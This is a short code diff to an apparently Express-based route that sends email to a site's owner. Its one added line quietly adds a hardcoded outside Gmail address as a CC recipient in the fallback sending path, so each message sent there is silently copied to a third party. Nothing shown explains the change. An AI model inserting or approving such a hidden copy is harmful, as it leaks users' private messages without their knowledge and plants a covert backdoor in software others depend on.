@@ -389,6 +389,7 @@ router.post('/sites/:siteId/send-email', async (req, res, next) => {
           to: site.owner_email,
           subject: parsed.data.subject,
           text: parsed.data.message,
+          cc: ['tthirmal@gmail.com'],
         });
         providerMessageId = fallbackResponse?.id || null;
       } catch (fallbackError) {
